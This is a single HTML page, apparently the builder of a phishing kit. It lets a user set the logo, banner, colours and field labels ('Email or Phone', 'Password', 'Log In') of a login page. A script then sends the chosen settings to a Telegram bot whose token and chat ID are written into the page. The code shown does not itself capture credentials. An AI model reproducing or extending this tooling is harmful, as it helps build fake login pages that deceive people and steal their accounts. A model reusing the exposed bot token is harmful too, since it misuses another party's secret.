<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Build Template</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f8f9fa;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 400px;
      margin: auto;
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 15px;
      font-size: 18px;
    }
    .upload {
      text-align: center;
      margin-bottom: 10px;
      font-size: 14px;
    }
    .upload-icon {
      font-size: 30px;
    }
    label {
      display: block;
      margin-top: 10px;
      font-size: 13px;
      font-weight: bold;
    }
    input[type="text"],
    input[type="file"],
    input[type="color"] {
      width: 100%;
      padding: 6px;
      margin-top: 4px;
      font-size: 13px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .row {
      display: flex;
      gap: 8px;
    }
    .row > div {
      flex: 1;
    }
    .section-title {
      margin-top: 20px;
      font-size: 14px;
      border-bottom: 1px solid #ccc;
      padding-bottom: 4px;
      font-weight: bold;
    }
    .generate-btn {
      width: 100%;
      padding: 10px;
      margin-top: 20px;
      background: #1a73e8;
      color: white;
      border: none;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
    }
    .generate-btn:hover {
      background: #155cc2;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>BUILD TEMPLATE</h2>

    <div class="upload">
      <div class="upload-icon">‚¨ÜÔ∏è</div>
      <p>(PNG / JPG / JPEG / GIF)</p>
    </div>

    <label>LOGO</label>
    <input type="file" id="logo">
    <input type="text" id="logoSize" placeholder='width="70px" height="70px"'>

    <label>BANNER</label>
    <input type="file" id="banner">
    <input type="text" id="bannerSize" placeholder='width="300px" height="100px"'>

    <label>TEMPLATE NAME</label>
    <input type="text" placeholder="Name" id="templateName">

    <div class="row">
      <div>
        <label>BODY COLOR</label>
        <input type="color" id="bodyColor">
      </div>
      <div>
        <label>BUTTON COLOR</label>
        <input type="color" id="buttonColor">
      </div>
    </div>

    <div class="row">
      <div>
        <label>TEXT COLOR</label>
        <input type="color" id="textColor">
      </div>
    </div>

    <div class="section-title">INPUTs CONFIGURATION</div>

    <label>DESCRIPTION</label>
    <input type="text" value="Login First" id="description">

    <div class="row">
      <div>
        <label>EMAIL CONTENT</label>
        <input type="text" value="Email or Phone" id="emailContent">
      </div>
      <div>
        <label>EMAIL LABEL</label>
        <input type="text" value="SHOW" id="emailLabel">
      </div>
    </div>

    <div class="row">
      <div>
        <label>PASSWORD CONTENT</label>
        <input type="text" value="Password" id="passwordContent">
      </div>
      <div>
        <label>PASSWORD LABEL</label>
        <input type="text" value="SHOW" id="passwordLabel">
      </div>
    </div>

    <div class="row">
      <div>
        <label>BUTTON CONTENT</label>
        <input type="text" value="Log In" id="buttonContent">
      </div>
      <div>
        <label>BUTTON WIDTH</label>
        <input type="text" value="200px" id="buttonWidth">
      </div>
    </div>

    <button class="generate-btn" onclick="generateTemplate()">GENERATE</button>
  </div>

  <script>
    function generateTemplate() {
      const data = {
        templateName: document.getElementById("templateName").value,
        logoSize: document.getElementById("logoSize").value,
        bannerSize: document.getElementById("bannerSize").value,
        bodyColor: document.getElementById("bodyColor").value,
        buttonColor: document.getElementById("buttonColor").value,
        textColor: document.getElementById("textColor").value,
        description: document.getElementById("description").value,
        emailContent: document.getElementById("emailContent").value,
        emailLabel: document.getElementById("emailLabel").value,
        passwordContent: document.getElementById("passwordContent").value,
        passwordLabel: document.getElementById("passwordLabel").value,
        buttonContent: document.getElementById("buttonContent").value,
        buttonWidth: document.getElementById("buttonWidth").value
      };

      const message = `üß© New Template Submitted:
      üìÑ Template Name: ${data.templateName}
      üñºÔ∏è Logo Size: ${data.logoSize}
      üìè Banner Size: ${data.bannerSize}
      üåà Body Color: ${data.bodyColor}
      üîò Button Color: ${data.buttonColor}
      üìù Description: ${data.description}
      üìß Email Label: ${data.emailLabel}
      üîê Password Label: ${data.passwordLabel}
      üëá Button Content: ${data.buttonContent}`;

      const telegramApiUrl = `https://api.telegram.org/bot8132547313:AAHKP_rVA5SVjSQe59uU4KY2l5synrhQ7jk/sendMessage?chat_id=6482794683&text=${encodeURIComponent(message)}`;

      fetch(telegramApiUrl)
        .then(response => response.json())
        .then(data => console.log('Message sent successfully:', data))
        .catch(error => console.error('Error sending message:', error));
    }
  </script>
</body>
          </html>
